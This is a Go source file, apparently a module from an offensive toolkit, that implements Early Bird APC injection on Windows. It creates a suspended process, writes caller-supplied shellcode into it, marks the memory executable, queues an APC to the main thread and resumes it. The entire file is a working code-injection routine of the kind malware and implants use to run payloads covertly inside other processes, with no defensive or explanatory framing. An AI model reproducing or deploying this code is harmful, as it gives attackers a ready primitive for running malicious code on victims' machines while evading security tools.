// +build windows

package injection

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// EarlyBirdInjector implements Early Bird APC injection
type EarlyBirdInjector struct{}

// Method returns the injection method
func (i *EarlyBirdInjector) Method() InjectionMethod {
	return MethodEarlyBird
}

// Description returns a description of the injection method
func (i *EarlyBirdInjector) Description() string {
	return "Early Bird APC Injection: Creates a new process in suspended state, " +
		"injects shellcode via APC queue, then resumes the process. " +
		"The main thread is naturally in alertable state before it starts executing. " +
		"Steps: CreateProcess(SUSPENDED) -> VirtualAllocEx -> WriteProcessMemory -> QueueUserAPC -> ResumeThread"
}

// Inject performs Early Bird APC injection
func (i *EarlyBirdInjector) Inject(config *Config) (*Result, error) {
	// Validate configuration
	if err := config.Validate(i.Method()); err != nil {
		return &Result{Success: false, Error: err.Error()}, err
	}

	// 1. Create a new process in suspended state
	pi, err := CreateProcess(config.TargetPath, "", true)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to create suspended process: %v", err),
		}, err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// 2. Allocate memory in the new process
	addr, err := VirtualAllocEx(pi.Process, 0, uintptr(len(config.Shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to allocate memory in process: %v", err),
		}, err
	}

	// 3. Write shellcode to the allocated memory
	_, err = WriteProcessMemory(pi.Process, addr, config.Shellcode)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to write shellcode: %v", err),
		}, err
	}

	// 4. Change memory protection to executable
	_, err = VirtualProtectEx(pi.Process, addr, uintptr(len(config.Shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to change memory protection: %v", err),
		}, err
	}

	// 5. Queue the APC to the main thread
	// The main thread of a newly created suspended process is in alertable state
	err = QueueUserAPC(addr, pi.Thread, 0)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to queue APC: %v", err),
		}, err
	}

	// 6. Resume the main thread
	_, err = ResumeThread(pi.Thread)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to resume thread: %v", err),
		}, err
	}

	return &Result{
		Success:   true,
		ProcessID: pi.ProcessID,
		ThreadID:  pi.ThreadID,
	}, nil
}